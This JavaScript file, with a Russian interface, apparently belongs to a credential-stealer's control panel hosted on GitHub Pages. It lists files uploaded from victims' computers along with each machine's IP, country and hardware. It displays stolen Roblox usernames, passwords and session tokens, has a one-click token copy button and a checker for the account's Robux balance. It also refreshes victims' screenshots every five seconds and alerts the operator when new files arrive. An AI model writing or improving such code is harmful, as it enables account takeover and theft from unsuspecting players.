// ── Дашборд (статическая версия для GitHub Pages) ─────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('headerSlot').innerHTML = renderHeader('files');
bindLogout();

let allFiles = [];
let currentToken = "";

async function getTextSnippet(path) {
  try {
    const res = await apiFetch(path);
    if (!res.ok) return "Ошибка предпросмотра";
    const text = await res.text();
    const escaped = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    return escaped.substring(0, 200) + (text.length > 200 ? "\n..." : "");
  } catch (e) {
    return "Не удалось прочесть превью.";
  }
}

async function loadFiles() {
  try {
    const r = await apiFetch("/files");
    const data = await r.json();
    // Фильтруем системные файлы
    allFiles = data.filter(f => !isHiddenFile(f.originalName || f.name));
    updateStats();
    populatePCFilter();
    filterFiles();
  } catch (e) {
    if (e.message !== 'auth') toast("Ошибка загрузки файлов", "err");
  }
}

function updateStats() {
  document.getElementById("sTotal").textContent = allFiles.length;
  const pcs = new Set(allFiles.map(function(f) { return f.computer?.name || "Unknown"; })).size;
  document.getElementById("sPCs").textContent = pcs;
  const totalSize = allFiles.reduce(function(s, f) { return s + (f.size || 0); }, 0);
  document.getElementById("sSize").textContent = fmtSize(totalSize);
  const last = allFiles[0];
  document.getElementById("sLast").textContent = last ? fmtDate(last.uploadedAt) : "—";
}

function populatePCFilter() {
  const sel = document.getElementById("filterPC");
  const cur = sel.value;
  const pcs = Array.from(new Set(allFiles.map(function(f) { return f.computer?.name || "Unknown"; })));
  let opts = "<option value=''>Все отправители</option>";
  for (let i = 0; i < pcs.length; i++) {
    const p = pcs[i];
    opts += "<option value='" + escapeHtml(p) + "' " + (p === cur ? "selected" : "") + ">💻 " + escapeHtml(p) + "</option>";
  }
  sel.innerHTML = opts;
}

function filterFiles() {
  const searchVal = document.getElementById("searchBar").value.toLowerCase();
  const filterPC = document.getElementById("filterPC").value;

  let list = allFiles;
  if (searchVal) {
    list = list.filter(function(f) { return (f.originalName || f.name).toLowerCase().includes(searchVal); });
  }
  if (filterPC) {
    list = list.filter(function(f) { return (f.computer?.name || "Unknown") === filterPC; });
  }

  renderFiles(list);
}

function renderFiles(list) {
  const grid = document.getElementById("fileGrid");
  if (list.length === 0) {
    grid.innerHTML = "<div class='empty'><span class='empty-icon'>🌌</span>Совпадений не найдено</div>";
    return;
  }

  let html = "";
  for (let i = 0; i < list.length; i++) {
    const f = list[i];
    const idx = allFiles.indexOf(f);
    const nm = f.originalName || f.name;
    const pcName = f.computer?.name || "Unknown";
    const pcCountry = f.computer?.country || "—";
    const dlUrl = assetUrl("/uploads/" + encodeURIComponent(f.name));
    const ts = Date.now();

    let previewHTML = "";
    if (isImg(nm)) {
      previewHTML = "<img class='live-preview' data-pc='" + escapeHtml(pcName) + "' data-url='" + dlUrl + "' src='" + dlUrl + "?t=" + ts + "' alt='' loading='lazy'>";
    } else if (isText(nm)) {
      previewHTML = "<div class='card-preview-text text-preview-placeholder' data-url='/uploads/" + encodeURIComponent(f.name) + "'>Загрузка превью...</div>";
    } else {
      previewHTML = "<div class='card-preview-icon'>" + icon(nm) + "</div>";
    }

    html += "<div class='file-card' onclick=\"openModalByIndex(" + idx + ")\">" +
              "<div class='card-preview'>" + previewHTML + "</div>" +
              "<div class='card-body'>" +
                "<div class='card-title' title='" + escapeHtml(pcName) + "'>" + escapeHtml(pcName) + "</div>" +
                "<div class='card-meta'>" +
                  "<span class='badge badge-pc'>🌍 " + escapeHtml(pcCountry) + "</span>" +
                  "<span class='badge badge-size'>" + fmtSize(f.size || 0) + "</span>" +
                "</div>" +
              "</div>" +
            "</div>";
  }

  grid.innerHTML = html;
  loadTextPreviews();
}

// Автообновление превью скриншотов каждые 5 секунд
setInterval(function() {
  document.querySelectorAll(".live-preview").forEach(function(img) {
    const url = img.getAttribute("data-url");
    if (url) img.src = url + "?t=" + Date.now();
  });
}, 5000);

function loadTextPreviews() {
  document.querySelectorAll(".text-preview-placeholder").forEach(async function(el) {
    const url = el.getAttribute("data-url");
    if (!url) return;
    const text = await getTextSnippet(url);
    el.textContent = text;
    el.classList.remove("text-preview-placeholder");
  });
}

function openModalByIndex(idx) {
  const f = allFiles[idx];
  if (!f) return;
  const nm = f.originalName || f.name;
  const pc = f.computer || {};
  const dlUrl = assetUrl("/uploads/" + encodeURIComponent(f.name));

  document.getElementById("modalFilename").textContent = nm;
  document.getElementById("specName").textContent = pc.name || "—";
  document.getElementById("specIp").textContent = pc.ip || "—";
  document.getElementById("specOs").textContent = pc.os || "—";
  document.getElementById("specCpu").textContent = pc.cpu || "—";
  document.getElementById("specRam").textContent = pc.ram || "—";
  document.getElementById("specGpu").textContent = pc.gpu || "—";
  document.getElementById("specDate").textContent = fmtDate(f.uploadedAt);
  document.getElementById("specSize").textContent = fmtSize(f.size || 0);

  const roblox = f.roblox || {};
  const robuxInfo = f.robuxInfo || {};
  const hasToken = roblox.security && roblox.security.length > 0;

  document.getElementById("robloxSpecUser").textContent = roblox.user || "—";
  document.getElementById("robloxSpecPass").textContent = roblox.pass || "—";

  const tokEl = document.getElementById("robloxSpecToken");
  const copyBtn = document.getElementById("robloxCopyBtn");
  if (hasToken) {
    tokEl.textContent = roblox.security;
    tokEl.scrollTop = 0;
    currentToken = roblox.security;
    copyBtn.style.display = "";
  } else {
    tokEl.textContent = "—";
    currentToken = "";
    copyBtn.style.display = "none";
  }

  const robuxRow = document.getElementById("robloxSpecRobuxRow");
  const statusRow = document.getElementById("robloxSpecStatusRow");
  const robuxEl = document.getElementById("robloxSpecRobux");
  const statusEl = document.getElementById("robloxSpecStatus");

  if (robuxInfo.robux !== undefined) {
    robuxRow.style.display = "flex";
    if (robuxInfo.valid === false) {
      robuxEl.textContent = "❌";
      robuxEl.style.color = "var(--danger)";
      statusRow.style.display = "flex";
      statusEl.textContent = "Токен недействителен";
      statusEl.style.color = "var(--danger)";
    } else {
      robuxEl.textContent = robuxInfo.robux.toLocaleString() + " R$";
      robuxEl.style.color = "var(--success)";
      if (robuxInfo.checked) {
        statusRow.style.display = "flex";
        statusEl.textContent = "Проверен: " + new Date(robuxInfo.checked).toLocaleString("ru");
        statusEl.style.color = "var(--text-secondary)";
      }
    }
  } else if (roblox.security) {
    robuxRow.style.display = "flex";
    robuxEl.textContent = "⏳ Не проверен";
    robuxEl.style.color = "var(--warning)";
    statusRow.style.display = "flex";
    statusEl.textContent = "Нажми «Проверить Robux»";
    statusEl.style.color = "var(--text-secondary)";
  } else {
    robuxRow.style.display = "none";
    statusRow.style.display = "none";
  }

  const pane = document.getElementById("modalPreviewPane");
  if (isImg(nm)) {
    pane.innerHTML = "<img src='" + dlUrl + "' alt=''>";
  } else if (isVid(nm)) {
    pane.innerHTML = "<video src='" + dlUrl + "' controls autoplay></video>";
  } else if (isAud(nm)) {
    pane.innerHTML = "<audio src='" + dlUrl + "' controls autoplay></audio>";
  } else if (isText(nm)) {
    pane.innerHTML = "<div class='modal-preview-text'>Загрузка файла...</div>";
    apiFetch("/uploads/" + encodeURIComponent(f.name)).then(res => res.text()).then(t => {
      const escaped = t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
      pane.querySelector(".modal-preview-text").innerHTML = escaped;
    }).catch(e => {
      pane.querySelector(".modal-preview-text").textContent = "Не удалось прочесть файл.";
    });
  } else {
    pane.innerHTML = "<div class='card-preview-icon' style='font-size: 7rem; opacity: 0.5;'>" + icon(nm) + "</div>";
  }

  document.getElementById("modalRobuxBtn").onclick = function() { checkRobux(f.name); };
  document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };

  document.getElementById("fileModal").style.display = "flex";
}

function closeModal() {
  document.getElementById("fileModal").style.display = "none";
  document.getElementById("modalPreviewPane").innerHTML = "";
}

function copyToken() {
  if (!currentToken) return;
  navigator.clipboard.writeText(currentToken).then(function() {
    toast("📋 Токен скопирован в буфер");
  }).catch(function() {
    const ta = document.createElement("textarea");
    ta.value = currentToken;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    toast("📋 Токен скопирован");
  });
}

async function deleteFile(name) {
  if (!confirm("Удалить файл?")) return;
  try {
    const r = await apiFetch("/files/" + encodeURIComponent(name), { method: "DELETE" });
    const d = await r.json();
    if (d.success) {
      toast("Файл удалён");
      closeModal();
      loadFiles();
    } else {
      toast("Ошибка удаления", "err");
    }
  } catch (e) {
    if (e.message !== 'auth') toast("Ошибка связи с сервером", "err");
  }
}

async function checkRobux(name) {
  const robuxRow = document.getElementById("robloxSpecRobuxRow");
  const robuxEl = document.getElementById("robloxSpecRobux");
  const statusRow = document.getElementById("robloxSpecStatusRow");
  const statusEl = document.getElementById("robloxSpecStatus");
  robuxRow.style.display = "flex";
  robuxEl.textContent = "⏳ Проверка...";
  robuxEl.style.color = "var(--warning)";
  statusRow.style.display = "flex";
  statusEl.textContent = "Запрос к Roblox API...";
  statusEl.style.color = "var(--warning)";
  try {
    const r = await apiFetch("/robux-check-file", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ filename: name })
    });
    const info = await r.json();
    if (info.valid) {
      robuxEl.textContent = info.robux.toLocaleString() + " R$";
      robuxEl.style.color = "var(--success)";
      statusEl.textContent = "Аккаунт: " + info.username + " (ID: " + info.userId + ")";
      statusEl.style.color = "var(--text-secondary)";
      toast("💰 Robux: " + info.robux.toLocaleString());
    } else {
      robuxEl.textContent = "❌";
      robuxEl.style.color = "var(--danger)";
      statusEl.textContent = "Ошибка: " + (info.error || "неизвестно");
      statusEl.style.color = "var(--danger)";
      toast("❌ Токен недействителен", "err");
    }
    loadFiles();
  } catch (e) {
    if (e.message === 'auth') return;
    robuxEl.textContent = "❌";
    statusEl.textContent = "Ошибка сети: " + e.message;
    statusEl.style.color = "var(--danger)";
  }
}

// ── SSE Realtime ──────────────────────────────────────────────────────────────
function setupSSE() {
  const sse = new EventSource(API_BASE + "/events?token=" + getToken());
  sse.onmessage = function(e) {
    try {
      const data = JSON.parse(e.data);
      if (data.event === "new_file" && !isHiddenFile(data.file?.originalName || data.file?.name)) {
        toast("📥 Получен новый файл!");
        playChime();
        loadFiles();
      }
    } catch(err) { }
  };
}

loadFiles();
setupSSE();
